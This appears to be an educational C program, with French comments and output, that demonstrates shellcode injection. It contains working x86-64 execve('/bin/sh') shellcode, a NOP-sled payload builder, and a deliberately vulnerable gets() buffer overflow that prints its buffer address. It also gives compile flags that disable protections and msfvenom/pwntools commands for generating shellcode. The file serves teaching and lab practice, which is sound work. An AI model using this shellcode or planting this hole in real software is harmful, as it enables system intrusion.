/*
 * ⚠️ AVERTISSEMENT : Code éducatif avec shellcode INTENTIONNEL
 * Uniquement sur tes propres systèmes de test. Usage malveillant est ILLÉGAL.
 *
 * Démonstration de shellcode injection et exécution.
 * Compilation : gcc -fno-stack-protector -z execstack -no-pie example.c -o example
 */

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Shellcode x86-64 : execve("/bin/sh", NULL, NULL)
unsigned char shellcode_execve[] =
    "\x48\x31\xf6"              // xor rsi, rsi
    "\x56"                      // push rsi
    "\x48\xbf\x2f\x62\x69\x6e"  // movabs rdi, 0x68732f6e69622f
    "\x2f\x2f\x73\x68"
    "\x57"                      // push rdi
    "\x54"                      // push rsp
    "\x5f"                      // pop rdi
    "\x6a\x3b"                  // push 59 (execve)
    "\x58"                      // pop rax
    "\x99"                      // cdq
    "\x0f\x05";                 // syscall

// Shellcode : exit(0)
unsigned char shellcode_exit[] =
    "\x48\x31\xff"    // xor rdi, rdi
    "\x6a\x3c"        // push 60 (exit)
    "\x58"            // pop rax
    "\x0f\x05";       // syscall

void demo_execute_shellcode() {
    printf("\n=== Démonstration 1 : Exécution directe de shellcode ===\n");
    printf("Shellcode : exit(0)\n");
    printf("Taille : %zu bytes\n", sizeof(shellcode_exit) - 1);
    
    printf("\nOpcodes:\n");
    for (size_t i = 0; i < sizeof(shellcode_exit) - 1; i++) {
        printf("\\x%02x", shellcode_exit[i]);
    }
    printf("\n");

    printf("\nExécution du shellcode...\n");
    ((void(*)())shellcode_exit)();
    
    printf("Ce message ne sera jamais affiché.\n");
}

void vulnerable_program() {
    printf("\n=== Démonstration 2 : Injection via buffer overflow ===\n");
    
    char buffer[200];
    
    printf("Adresse du buffer : %p\n", (void*)buffer);
    printf("Pour exploiter :\n");
    printf("1. Placer le shellcode dans le buffer\n");
    printf("2. Calculer l'offset vers la return address\n");
    printf("3. Écraser la return address avec l'adresse du buffer\n\n");
    
    printf("Entrez le payload (ou 'quit') : ");
    gets(buffer);  // VULNÉRABLE
    
    if (strcmp(buffer, "quit") == 0) {
        return;
    }
    
    printf("Buffer reçu (%zu bytes)\n", strlen(buffer));
}

void demo_nop_sled() {
    printf("\n=== Démonstration 3 : NOP Sled ===\n");
    
    unsigned char payload[300];
    memset(payload, 0x90, 200);  // NOP sled
    
    // Copier le shellcode après les NOPs
    memcpy(payload + 200, shellcode_exit, sizeof(shellcode_exit) - 1);
    
    printf("Payload structure:\n");
    printf("  [NOP x 200] + [Shellcode %zu bytes]\n", sizeof(shellcode_exit) - 1);
    printf("  Total : %zu bytes\n", 200 + sizeof(shellcode_exit) - 1);
    printf("\nLe NOP sled permet d'avoir une large zone d'atterrissage.\n");
    printf("Sauter n'importe où dans les NOPs mènera au shellcode.\n");
}

void demo_shellcode_analysis() {
    printf("\n=== Démonstration 4 : Analyse de shellcode ===\n");
    
    printf("Shellcode execve(\"/bin/sh\"):\n");
    for (size_t i = 0; i < sizeof(shellcode_execve) - 1; i++) {
        printf("\\x%02x", shellcode_execve[i]);
        if ((i + 1) % 12 == 0) printf("\n");
    }
    printf("\n");
    
    printf("\nDésassemblage (approximatif):\n");
    printf("xor    %%rsi, %%rsi          ; rsi = NULL (argv)\n");
    printf("push   %%rsi                ; NULL terminator\n");
    printf("movabs $0x68732f6e69622f, %%rdi ; '/bin//sh'\n");
    printf("push   %%rdi\n");
    printf("push   %%rsp\n");
    printf("pop    %%rdi                ; rdi = &\"/bin/sh\"\n");
    printf("push   $0x3b                ; 59 = execve\n");
    printf("pop    %%rax\n");
    printf("cdq                        ; rdx = 0 (envp)\n");
    printf("syscall\n");
}

void print_menu() {
    printf("\n");
    printf("╔══════════════════════════════════════╗\n");
    printf("║  Shellcode - Démonstrations          ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf("\n");
    printf("1. Exécuter shellcode exit(0)\n");
    printf("2. Programme vulnérable (buffer overflow)\n");
    printf("3. NOP Sled\n");
    printf("4. Analyse de shellcode\n");
    printf("5. Informations de sécurité\n");
    printf("0. Quitter\n");
    printf("\nChoix : ");
}

void security_info() {
    printf("\n=== Informations de sécurité ===\n\n");
    
    printf("Protections contre le shellcode:\n\n");
    
    printf("1. DEP/NX (Data Execution Prevention):\n");
    printf("   Marque la stack comme non-exécutable.\n");
    printf("   Compilation : -z noexecstack (par défaut)\n");
    printf("   Ce programme : -z execstack (désactivé pour démo)\n\n");
    
    printf("2. ASLR (Address Space Layout Randomization):\n");
    printf("   Randomise les adresses à chaque exécution.\n");
    printf("   Sans ASLR, l'adresse du buffer est prévisible.\n");
    printf("   Avec ASLR, il faut leak l'adresse.\n\n");
    
    printf("3. Stack Canaries:\n");
    printf("   Détecte les buffer overflows.\n");
    printf("   Ce programme : -fno-stack-protector (désactivé)\n\n");
    
    printf("Générer du shellcode:\n");
    printf("  msfvenom -p linux/x64/exec CMD=/bin/sh -f c\n");
    printf("  python -c 'from pwn import *; print(shellcraft.sh())'\n");
}

int main() {
    int choice;
    char input[16];

    printf("⚠️  CODE ÉDUCATIF - SHELLCODE INTENTIONNEL\n");
    printf("Compilation : gcc -fno-stack-protector -z execstack -no-pie example.c -o example\n");

    while (1) {
        print_menu();

        if (fgets(input, sizeof(input), stdin) == NULL) {
            break;
        }

        choice = atoi(input);

        switch (choice) {
            case 1:
                demo_execute_shellcode();
                // Le programme quittera après exécution du shellcode
                break;
            case 2:
                vulnerable_program();
                break;
            case 3:
                demo_nop_sled();
                break;
            case 4:
                demo_shellcode_analysis();
                break;
            case 5:
                security_info();
                break;
            case 0:
                printf("\nAu revoir.\n");
                return 0;
            default:
                printf("\nChoix invalide.\n");
        }

        printf("\nAppuyez sur Entrée pour continuer...");
        getchar();
    }

    return 0;
}
